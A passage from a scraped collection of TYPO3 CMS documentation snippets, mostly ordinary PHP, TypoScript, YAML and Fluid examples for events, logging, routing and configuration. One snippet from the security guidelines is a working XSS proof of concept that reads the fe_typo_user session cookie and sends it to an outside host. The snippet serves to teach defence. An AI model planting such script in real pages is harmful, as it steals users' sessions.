TYPO3\\CMS\\Backend\\Form\\Event\\ModifyEditFormUserAccessEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyEditFormUserAccessEvent $event): void\n    {\n        $record = $event->getRecord();\n\n        if ($record['pid'] === 0) {\n            // Deny access to edit root-level pages\n            $event->setUserAccessDenied();\n            return;\n        }\n\n        if ($record['doktype'] === 1) {\n            // Allow access to edit standard pages\n            $event->setUserAccessGranted();\n            return;\n        }\n\n        // Keep initial Core decision for all other cases\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GitHub Link Handler in JavaScript for TYPO3 CMS\nDESCRIPTION: This snippet defines a GitHubLinkHandler class that handles form submissions for GitHub issue links. It prevents default form submission, processes the input value, and uses the LinkBrowser.finalizeFunction to set the formatted link.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_CustomLinkHandlerJavaScript.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n/*\n * This file is part of the TYPO3 CMS project.\n *\n * It is free software; you can redistribute it and/or modify it under\n * the terms of the GNU General Public License, either version 2\n * of the License, or any later version.\n *\n * For the full copyright and license information, please read the\n * LICENSE.txt file that was distributed with this source code.\n *\n * The TYPO3 project - inspiring people to share!\n */\n\nimport LinkBrowser\n\tfrom \"@typo3/backend/link-browser.js\";\n\n/**\n * Module: @t3docs/examples/github_link_handler.js\n * Github issue link interaction\n */\n\nclass GitHubLinkHandler {\n\tconstructor() {\n\t\tvar form_el = document.getElementById(\"lgithubform\");\n\t\tform_el.addEventListener(\"submit\", function(event) {\n\t\t\tevent.preventDefault();\n\t\t\tvar value = document.getElementById('lgithub').value;\n\t\t\tif (value === 't3://github?issue=') {\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (value.indexOf('t3://github?issue=') === 0) {\n\t\t\t\tvalue = value.substring(18);\n\t\t\t}\n\t\t\tLinkBrowser.finalizeFunction('t3://github?issue=' + value);\n\t\t});\n\t}\n}\n\nexport default new GitHubLinkHandler();\n```\n\n----------------------------------------\n\nTITLE: Configuring FilesProcessor with FLUIDTEMPLATE\nDESCRIPTION: TypoScript configuration for using the FilesProcessor to load file references for a content element and make them available in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_4\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.carousel = FLUIDTEMPLATE\nlib.carousel {\n  file = EXT:my_extension/Resources/Private/Templates/Carousel.html\n  dataProcessing.10 = TYPO3\\CMS\\Frontend\\DataProcessing\\FilesProcessor\n  dataProcessing.10 {\n    references {\n      table = tt_content\n      fieldName = image\n    }\n    as = images\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Content Element Type\nDESCRIPTION: TCA configuration to register a new content element type in TYPO3\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addTcaSelectItem(\n    'tt_content',\n    'CType',\n    [\n        'Basic Content',\n        'myextension_basiccontent',\n        'content-text',\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Logging for Authentication\nDESCRIPTION: This PHP code snippet configures TYPO3 logging to record authentication attempts, storing logs in a specified file. It requires TYPO3 and the associated logging APIs/extensions. The main parameter here is the log level, set to INFO, which determines the verbosity of the logged information. The output is a log file capturing information for further analysis with tools like fail2ban.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FurtherActions.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\n   $GLOBALS['TYPO3_CONF_VARS']['LOG']['TYPO3']['CMS']['Core']['Authentication']['writerConfiguration'] = [\n       \\Psr\\Log\\LogLevel::INFO => [\n           \\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class => [\n               'logFile' => \\TYPO3\\CMS\\Core\\Core\\Environment::getVarPath() . '/log/typo3_auth.log',\n           ]\n       ]\n   ];\n\n```\n\n----------------------------------------\n\nTITLE: ModifyFileReferenceControlsEvent Class Definition\nDESCRIPTION: PHP class that provides methods to modify and manage file reference controls in TYPO3 CMS Backend Form system. The class includes methods for getting, setting, checking, and removing controls, as well as accessing related record and configuration data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyFileReferenceControlsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Form\\Event;\n\nclass ModifyFileReferenceControlsEvent\n{\n    public function getControls(): array;\n    public function setControls(array $controls): void;\n    public function getControl(string $identifier): string;\n    public function setControl(string $identifier, string $markup): void;\n    public function hasControl(string $identifier): bool;\n    public function removeControl(string $identifier): bool;\n    public function getElementData(): array;\n    public function getRecord(): array;\n    public function getParentUid(): string;\n    public function getForeignTable(): string;\n    public function getFieldConfiguration(): array;\n    public function isVirtual(): bool;\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Language Aspect Properties in TYPO3 PHP Controller\nDESCRIPTION: Demonstrates how to retrieve language-related information using the Language aspect in a TYPO3 controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Context\\Context;\n\nclass MyController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n\n    public function myAction(): void\n    {\n        $languageId = $this->context->getPropertyFromAspect('language', 'id');\n        $fallbackChain = $this->context->getPropertyFromAspect('language', 'fallbackChain');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Overriding Site Settings in YAML\nDESCRIPTION: This YAML snippet shows how to override default site settings within a subset configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nstyles:\n  content:\n    defaultHeaderType: 1\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Settings in TypoScript for TYPO3 CMS\nDESCRIPTION: This snippet shows how to access site settings in page TSconfig or TypoScript in TYPO3 CMS. It demonstrates setting default PIDs for record storage and configuring category selection for plugins.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettings.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\n// store tx_ext_data records on the given storage page by default (e.g. through IRRE)\nTCAdefaults.tx_ext_data.pid = {$categoryPid}\n\n// load category selection for plugin from out dedicated storage page\nTCEFORM.tt_content.pi_flexform.ext_pi1.sDEF.categories.PAGE_TSCONFIG_ID = {$categoryPid}\n```\n\n----------------------------------------\n\nTITLE: Fluid Layout Location for Page Views (HTML)\nDESCRIPTION: Illustrates the typical location of Fluid layouts used by the page view in TYPO3 site packages. These layouts are usually located in `/Resources/Private/PageView/Layouts/` and included via the `<f:layout>` ViewHelper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/PageView/Layouts/SomeLayout.html\"\n```\n\n----------------------------------------\n\nTITLE: Accessing FrontendTypoScript from Content Objects in TYPO3 CMS\nDESCRIPTION: Demonstrates how to retrieve the FrontendTypoScript object from a request attribute in TYPO3 CMS content objects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/FrontendTypoScript.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$frontendTypoScript = $request->getAttribute('frontend.typoscript');\n```\n\n----------------------------------------\n\nTITLE: Creating and Deleting Record in TYPO3 Workspace\nDESCRIPTION: CSV table illustrating the database representation of creating a new record and then deleting it within a TYPO3 workspace. It shows how both the placeholder and version records are marked as deleted and removed from the workspace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_12\n\nLANGUAGE: csv\nCODE:\n```\nuid,pid,deleted,sorting,t3ver_wsid,t3ver_oid,t3ver_state,l10n_parent,sys_language_uid,title\n...,...,...,...,...,...,...,...,...,...,...\n25,20,1,512,0,0,1,0,0,Article #4 new & deleted\n26,-1,1,512,0,25,-1,0,0,Article #4 new & deleted\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for Backend APIs in TYPO3 CMS Documentation\nDESCRIPTION: This reStructuredText snippet defines the structure and table of contents for the Backend APIs section in the TYPO3 CMS Core API documentation. It includes directives for indexing, cross-referencing, and organizing subsections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index:: Backend\n.. _backend:\n\n============\nBackend APIs\n============\n\nThe following APIs are of interest if you want to configure or extend the\nfunctionalities of the backend.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    */Index\n    *\n```\n\n----------------------------------------\n\nTITLE: PHP BrokenLinkAnalysisEvent Usage Example\nDESCRIPTION: Example demonstrating how to use BrokenLinkAnalysisEvent for transforming text in RTE. The code shows how to convert 'TYPO3' text into a special tag format '[tag:typo3]' for internal storage and processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Html/BrokenLinkAnalysisEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Html\\Event\\BrokenLinkAnalysisEvent\n```\n\n----------------------------------------\n\nTITLE: Using Variables in ViewHelper Attributes\nDESCRIPTION: Demonstrates how to insert variables into ViewHelper attributes using curly braces in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_18\n\nLANGUAGE: html\nCODE:\n```\nNow it is: <f:format.date format=\"{format}\">{date}</f:format.date>\n```\n\n----------------------------------------\n\nTITLE: Implementing ShouldUseCachedPageDataIfAvailableEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the ShouldUseCachedPageDataIfAvailableEvent in TYPO3. The listener checks if the request is from the CLI and sets the event to not use cached page data if true.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/ShouldUseCachedPageDataIfAvailableEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Http\\ServerRequest;\nuse TYPO3\\CMS\\Frontend\\Event\\ShouldUseCachedPageDataIfAvailableEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ShouldUseCachedPageDataIfAvailableEvent $event): void\n    {\n        $request = $event->getRequest();\n        if ($request instanceof ServerRequest && $request->getAttribute('applicationType') === 'CLI') {\n            $event->setUseCachedPageData(false);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Documenting Function with phpDoc in PHP\nDESCRIPTION: This snippet demonstrates how to use phpDoc to document a function in a TYPO3 extension. The function parameters, return types, and descriptions are explained, enhancing code readability and maintenance. Dependencies include the consideration of TYPO3's TypoScript configuration as input. The function is expected to return a boolean indicating the success or failure of the initialization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/UsingPhpdoc.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\n    /**\n     * Initializes the plugin.\n     *\n     * Checks the configuration and substitutes defaults for missing values.\n     *\n     * @param array $conf Plugin configuration from TypoScript\n     * @return bool true if initialization was successful, false otherwise\n     * @see MyClass:anotherFunc()\n     */\n    protected function initialize(array $conf): bool\n    {\n        // Do something\n    }\n\n```\n\n----------------------------------------\n\nTITLE: Adding Nested Canonical URL Parameters in TYPO3\nDESCRIPTION: Shows how to configure nested arguments for canonical URL generation in TYPO3's global configuration. This example demonstrates adding a multi-level argument structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/CanonicalApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['additionalCanonicalizedUrlParameters'][] = 'example_argument_name[second_level]';\n```\n\n----------------------------------------\n\nTITLE: Validating Integer Fields in Extbase\nDESCRIPTION: IntegerValidator checks if a field contains integer values, beneficial for numeric fields requiring whole numbers like IDs or counts. It's an integral part of Extbase when dealing with strictly whole number fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n#[Validate(['validator' => 'Integer'])]\nprotected mixed $quantity;\n```\n\n----------------------------------------\n\nTITLE: Running t3ll Translation Tool on Windows\nDESCRIPTION: Command to run the t3ll translation tool for local XLIFF file editing on Windows systems.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nt3ll.exe path\\to\\your\\extension\\Resources\\Private\\Language\\locallang.xlf\n```\n\n----------------------------------------\n\nTITLE: Including Request Token in Fluid Template Form\nDESCRIPTION: This HTML snippet shows how to use the request token in a Fluid template form. The token is assigned to the form ViewHelper using the requestToken attribute, which will insert a hidden field with the token value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/CSRFlikeRequestTokenHandling.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<!-- Assign request token object for ViewHelper -->\n<f:form action=\"process\" requestToken=\"{requestToken}\">\n    ...\n</f:form>\n```\n\n----------------------------------------\n\nTITLE: Using getVersionDifferences and setVersionDifferences Methods\nDESCRIPTION: Methods available in the ModifyVersionDifferencesEvent for accessing and modifying version differences data in the Workspaces module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/ModifyVersionDifferencesEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\ngetVersionDifferences()\nsetVersionDifferences(array $versionDifferences)\n```\n\n----------------------------------------\n\nTITLE: Securing Backend Routes with Referrer Checking in TYPO3\nDESCRIPTION: Code example demonstrating how to secure backend routes using the referrer option to prevent cross-site request forgery. This enforces existence of HTTP Referer header for public routes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'main' => [\n    'path' => '/main',\n    'referrer' => 'required,refresh-empty',\n    'target' => Controller\\BackendController::class . '::mainAction'\n],\n```\n\n----------------------------------------\n\nTITLE: Using NotEmpty Validator with Attribute in PHP\nDESCRIPTION: Example of applying the NotEmpty validator to ensure a property value is not empty. This is commonly used to enforce required fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n#[Validate(['validator' => 'NotEmpty'])]\nprotected string $title;\n```\n\n----------------------------------------\n\nTITLE: Defining LoginAttemptFailedEvent Class in PHP for TYPO3 CMS Core Authentication\nDESCRIPTION: This code snippet defines the LoginAttemptFailedEvent class within the TYPO3\\CMS\\Core\\Authentication\\Event namespace. The class represents an event that is triggered after a failed login attempt and provides methods to access relevant data about the attempt.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/LoginAttemptFailedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Core\\Authentication\\Event\n\n..  php:class:: LoginAttemptFailedEvent\n\n    Event fired after a login attempt failed.\n\n    ..  php:method:: getUser()\n        :returns: `\\TYPO3\\CMS\\Core\\Authentication\\AbstractUserAuthentication`\n\n    ..  php:method:: getLoginData()\n        :returns: `array`\n\n    ..  php:method:: isFrontendAttempt()\n        :returns: `bool`\n\n    ..  php:method:: isBackendAttempt()\n        :returns: `bool`\n\n    ..  php:method:: getRequest()\n        :returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\n----------------------------------------\n\nTITLE: Registering Custom News FormEngine Provider\nDESCRIPTION: Example showing how to register a custom FormEngine data provider for the news extension, positioning it between TcaFlexPrepare and TcaFlexProcess in the processing chain.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/DataCompiling/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['formDataGroup']['tcaDatabaseRecord'][\\GeorgRinger\\News\\Backend\\FormDataProvider\\NewsFlexFormManipulation::class] = [\n    'depends' => [\n        \\TYPO3\\CMS\\Backend\\Form\\FormDataProvider\\TcaFlexPrepare::class,\n    ],\n    'before' => [\n        \\TYPO3\\CMS\\Backend\\Form\\FormDataProvider\\TcaFlexProcess::class,\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Defining RenderAdditionalContentToRecordListEvent Class in PHP\nDESCRIPTION: This code snippet defines the RenderAdditionalContentToRecordListEvent class in TYPO3 CMS. It includes properties for content before and after the main content, and methods to get and set these properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/RenderAdditionalContentToRecordListEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class RenderAdditionalContentToRecordListEvent\n{\n    private string $contentPre = '';\n    private string $contentPost = '';\n\n    public function __construct(\n        private readonly string $table,\n        private readonly int $pageId\n    ) {\n    }\n\n    public function getTable(): string\n    {\n        return $this->table;\n    }\n\n    public function getPageId(): int\n    {\n        return $this->pageId;\n    }\n\n    public function getContentPre(): string\n    {\n        return $this->contentPre;\n    }\n\n    public function setContentPre(string $contentPre): void\n    {\n        $this->contentPre = $contentPre;\n    }\n\n    public function getContentPost(): string\n    {\n        return $this->contentPost;\n    }\n\n    public function setContentPost(string $contentPost): void\n    {\n        $this->contentPost = $contentPost;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Route Enhancer in TYPO3\nDESCRIPTION: Demonstrates how to register a custom route enhancer in an extension's ext_localconf.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/AdvancedRoutingConfiguration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['routing']['enhancers']['CustomEnhancer'] =\n    \\MyVendor\\MyExtension\\Routing\\CustomEnhancer::class;\n```\n\n----------------------------------------\n\nTITLE: Demonstrating XSS Vulnerability in TypoScript\nDESCRIPTION: This snippet shows how malicious JavaScript can be inserted into a page using TypoScript. It reads and displays cookie data, potentially submitting it to an external site.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/Typoscript.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage.10 = COA\npage.10 {\n  10 = TEXT\n  10.value (\n    <h1>XSS &#43; TypoScript - proof of concept</h1>\n    <p>Submitting (harmless) cookie data to google.com in a few seconds...</p>\n  )\n  20 = TEXT\n  20.value (\n    <script type=\"text/javascript\">\n    document.write('<p>');\n    // read cookies\n    var i, key, data, cookies = document.cookie.split(\";\");\n    var loc = window.location;\n    for (i = 0; i < cookies.length; i++) {\n      // separate key and value\n      key = cookies[i].substr(0, cookies[i].indexOf(\"=\"));\n      data = cookies[i].substr(cookies[i].indexOf(\"=\") + 1);\n      key = key.replace(/^\\s+|\\s+$/g,\"\");\n      // show key and value\n      document.write(unescape(key) + ': ' + unescape(data) + '<br />');\n      // submit cookie data to another host\n      if (key == 'fe_typo_user') {\n        setTimeout(function() {\n          loc = 'https://www.google.com/?q=' + loc.hostname ;\n          window.location = loc + ':' + unescape(key) + ':' + unescape(data);\n        }, 5000);\n      }\n    }\n    document.write('</p>');\n    </script>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: Defining BeforePageLanguageOverlayEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the BeforePageLanguageOverlayEvent class with its methods for getting and setting page input, page IDs, and language aspect. It is used in the page translation process of TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforePageLanguageOverlayEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Domain\\Event;\n\nclass BeforePageLanguageOverlayEvent\n{\n    public function getPageInput(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setPageInput(array $pageInput): void\n    {\n        // Implementation not shown\n    }\n\n    public function getPageIds(): array\n    {\n        // Implementation not shown\n    }\n\n    public function setPageIds(array $pageIds): void\n    {\n        // Implementation not shown\n    }\n\n    public function getLanguageAspect(): \\TYPO3\\CMS\\Core\\Context\\LanguageAspect\n    {\n        // Implementation not shown\n    }\n\n    public function setLanguageAspect(\\TYPO3\\CMS\\Core\\Context\\LanguageAspect $languageAspect): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterTcaCompilationEvent Class Methods in TYPO3\nDESCRIPTION: PHP class definition for AfterTcaCompilationEvent that provides methods to get and set TCA (Table Configuration Array) after compilation but before caching. The class includes getTca() method that returns the TCA array and setTca() method that allows setting a new TCA array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterTcaCompilationEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Configuration\\Event;\n\nclass AfterTcaCompilationEvent\n{\n    public function getTca(): array\n    {\n        // Returns the TCA array\n    }\n\n    public function setTca(array $tca)\n    {\n        // Sets the TCA array\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering a New Page Type in PageDoktypeRegistry\nDESCRIPTION: Adds a new Archive page type to the TYPO3 PageDoktypeRegistry in ext_tables.php. This configuration allows all kinds of tables to be inserted on this page type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/CreateNewPageType.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ncall_user_func(static function () {\n    // Add new page types:\n    $typeRegistry = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n        \\TYPO3\\CMS\\Core\\DataHandling\\PageDoktypeRegistry::class\n    );\n    $typeRegistry->add('Archive', 116, '*');\n});\n```\n\n----------------------------------------\n\nTITLE: Example Complex URI Structure\nDESCRIPTION: Demonstrates breakdown of a complex URL into its components including protocol, domain, route parts, and query parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Introduction.rst#2025-04-16_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nhttps://subdomain.example.com:80/en/about-us/our-team/john-doe/publications/index.xhtml?utm_campaign=seo#start\n```\n\n----------------------------------------\n\nTITLE: Using orderBy in TYPO3 Query Builder (PHP)\nDESCRIPTION: Shows how to use the orderBy method to add ORDER BY clauses to a SELECT statement. The example selects all records from the sys_language table and orders them by the sorting field in ascending order.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_21\n\nLANGUAGE: php\nCODE:\n```\n// SELECT * FROM `sys_language` ORDER BY `sorting` ASC\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language');\n$queryBuilder->getRestrictions()->removeAll();\n$languageRecords = $queryBuilder\n    ->select('*')\n    ->from('sys_language')\n    ->orderBy('sorting')\n    ->executeQuery()\n    ->fetchAllAssociative();\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeRecordIsAnalyzedEvent Listener in PHP\nDESCRIPTION: This snippet shows the basic structure of a class that listens to the BeforeRecordIsAnalyzedEvent. It defines an __invoke method that accepts the event as a parameter.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Linkvalidator\\Event\\BeforeRecordIsAnalyzedEvent;\n\nfinal class CheckExternalLinksToLocalPagesEventListener\n{\n    public function __invoke(BeforeRecordIsAnalyzedEvent $event): void\n    {\n        // Custom logic here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring CSP inherit-again mode in YAML\nDESCRIPTION: Example of using the inherit-again mode in YAML configuration for Content Security Policy. This mode inherits again from the corresponding ancestor chain and merges existing sources.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ndefault:\n  -\n    - \"'self'\"\n    - data:\n\nimg-src:\n  -\n    mode: inherit-again\n    # \"data:\" is merged by inheritance\n  -\n    - \"'self'\"\n    - example.com\n\ndefault:\n  -\n    - \"'self'\"\n    - data:\n\nimg-src:\n  -\n    mode: inherit-again\n    # \"data:\" is merged by inheritance\n  -\n    - \"'self'\"\n    - example.com\n```\n\n----------------------------------------\n\nTITLE: Configuring Module Data in TYPO3 Backend\nDESCRIPTION: Example of setting default module data properties that can be overridden by GET/POST parameters in a TYPO3 backend module configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'my_module' => [\n        'moduleData' => [\n            'sortBy' => 'title',\n            'sortOrder' => 'ASC',\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Creating a Hook with callUserFunction in TYPO3 Extension\nDESCRIPTION: Example of creating a hook using GeneralUtility::callUserFunction() for constructor post-processing. This shows how to call user-defined functions after class initialization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Hooks/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\npublic function __construct()\n{\n    // do something\n\n    // Call post-processing function\n    if (is_array($GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['my_extension']['constructor-PostProc'] ?? false)) {\n        $_params = [\n            'table' => $this->table,\n        ];\n        foreach ($GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['my_extension']['constructor-PostProc'] as $_funcRef) {\n            GeneralUtility::callUserFunction($_funcRef, $_params, $this);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring MemoryUsageProcessor for Examples extension in TYPO3\nDESCRIPTION: This snippet shows how to configure a MemoryUsageProcessor for the controllers of the 'examples' extension in TYPO3. It applies to ERROR level log entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['T3docs']['Examples']['Controller']['processorConfiguration'] = [\n    // Configuration for ERROR level log entries\n    \\Psr\\Log\\LogLevel::ERROR => [\n        // Add a MemoryUsageProcessor\n        \\TYPO3\\CMS\\Core\\Log\\Processor\\MemoryUsageProcessor::class => [\n            'formatSize' => TRUE\n        ],\n    